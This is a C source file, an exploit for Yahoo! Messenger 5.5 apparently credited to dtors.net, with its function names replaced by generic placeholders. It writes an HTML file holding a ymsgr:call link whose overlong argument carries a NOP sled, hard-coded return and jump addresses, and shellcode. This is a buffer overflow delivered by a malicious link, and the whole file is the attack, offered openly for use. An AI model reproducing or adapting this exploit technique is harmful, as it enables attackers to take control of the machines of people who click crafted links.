#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC2 (char*,char*) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ *,char*,...) ; 
 int /*<<< orphan*/  FUNC4 (unsigned char*,char*,int) ; 
 int /*<<< orphan*/  FUNC5 (unsigned char*,int,int) ; 
 char* ret ; 
 int /*<<< orphan*/ * stderr ; 
 int /*<<< orphan*/ * stdout ; 
 int FUNC6 (char*) ; 
 char* win32_msgbox ; 

int FUNC7(int argc,char *argv[])
{
 FILE *evil;
 char *shellcode = win32_msgbox;
 unsigned char buffer[5000];
 int offset=320;

                FUNC3(stdout, "\n\tYahPoo.c By bob.\n");
	        FUNC3(stdout, "Remote Exploit for Yahoo! Messenger 5.5\n");
	        FUNC3(stdout, "\tDSR-[www.dtors.net]-DSR\n\n");

                FUNC3(stdout,"Makin' da EbUL HTML File... ");
		if ((evil =FUNC2("yahoo.html","w"))==NULL){
			FUNC3(stderr,"Failed\n");
			FUNC0(1);
			} else {
			FUNC3(stderr,"Opened!\n");
			}



	FUNC5(buffer,0x00,offset+32+FUNC6(shellcode));
 	FUNC5(buffer,0x90,offset);


	FUNC4(buffer+offset,ret,4);
	FUNC4(buffer+offset+4,shellcode,FUNC6(shellcode));

        buffer[264] = 0xD4;   //address of &shellcode
        buffer[265] = 0x96;
        buffer[266] = 0x7A;
        buffer[267] = 0x01;
        
        buffer[272] = 0xF5;   //jmp 0xc [msvcrt.dll]
	buffer[273] = 0x01;
	buffer[274] = 0x01;
	buffer[275] = 0x78;

	FUNC3(evil,"<html>");
	FUNC3(evil,"<title>Bought to you by dtors.net!</title>\n");
	FUNC3(evil,"<B>Dtors Security Research (DSR)</B>\n");
	FUNC3(evil,"<p>Yahoo Messenger 5.5 exploit....</p>\n");
	FUNC3(evil,"<pre>");
	FUNC3(evil,"<a href=%cymsgr:call?%s%c>!EbUL Link!</a></body></pre></html>\x00\x00\x00",0x22,buffer,0x22);
	FUNC1(evil); // <-- closing yahoo.html
	
	FUNC3(stdout,"\nDa ebUL HTML file is >>yahoo.html<<\nEnjoy!\nwww.dtors.net\n\n");

  }